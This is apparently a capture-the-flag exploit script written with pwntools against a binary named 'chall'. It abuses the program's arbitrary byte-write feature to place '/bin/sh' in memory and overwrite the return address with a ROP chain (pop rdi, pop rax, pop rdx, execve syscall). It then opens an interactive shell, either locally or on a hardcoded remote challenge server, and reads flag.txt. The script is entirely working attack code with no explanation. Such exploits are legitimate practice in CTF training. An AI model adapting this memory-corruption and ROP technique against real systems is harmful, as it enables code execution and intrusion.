from pwn import *
from pwnlib import timeout

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc


def ddebug(io, b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


bss_binsh = 0x57B280
"""
0x000000000040336c : syscall
0x000000000046b3e6 : pop rdi ; setne al ; ret    # binsh address 
0x00000000004224c4 : pop rax ; ret               # 59
0x000000000047bd2e : pop rdx ; sbb byte ptr [rax + 0x29], cl ; ret
"""
syscall = 0x000000000040336c
pop_rdi = 0x000000000046b3e6
pop_rax = 0x00000000004224c4
pop_rdx = 0x000000000047bd2e


def pwn(io):
    r_w = "Read or Write? (r/w):"
    io.sendlineafter(r_w, b"w")
    io.sendlineafter(
        "Enter memory address (in hex, e.g., 0x12345678): ", "0xc00009cdb8")
    io.sendlineafter("Enter byte to write (in hex, e.g., 0xAB): ", "0x50")
    data = io.recvuntil("Read or Write?", timeout=1)
    log.hexdump(data)

    if b"Read" not in data:
        return

    for j, k in enumerate("/bin/sh"):
        address = bss_binsh + j
        io.sendlineafter("(r/w):", b"w")
        io.sendlineafter(
            "Enter memory address (in hex, e.g., 0x12345678): ", hex(address))
        io.sendlineafter(
            "Enter byte to write (in hex, e.g., 0xAB): ", hex(ord(k)))

    ret_address = 0xc00009cf48
    payload = p64(pop_rdi) + p64(bss_binsh)
    payload += p64(pop_rax) + p64(0x585F70)
    payload += p64(pop_rdx) + p64(0)
    payload += p64(pop_rax) + p64(59)
    payload += p64(syscall)

    log.success(len(payload)+len("/bin/sh"))
    # ddebug(io, "b *0x0485051\n b *0x484FDA\n b *0x485441 \n continue")
    ddebug(io, "b *0x485441 \n continue")
    for j, k in enumerate(payload):
        address = ret_address + j
        io.sendlineafter("(r/w):", b"w")
        io.sendlineafter(
            "Enter memory address (in hex, e.g., 0x12345678): ", hex(address))
        io.sendlineafter("Enter byte to write (in hex, e.g., 0xAB): ", hex(k))
    io.sendline(b"cat flag.txt")
    io.interactive()


def getio():
    io = process([vuln_path]) if not f_remote else remote("34.45.81.67", 16003)
    return io


for i in range(0x10):
    io = None
    try:
        io = getio()
        pwn(io)

        # io.interactive()
    except Exception as e:
        log.info("-----------------")
        log.info(e)
    finally:
        if io:
            io.close()
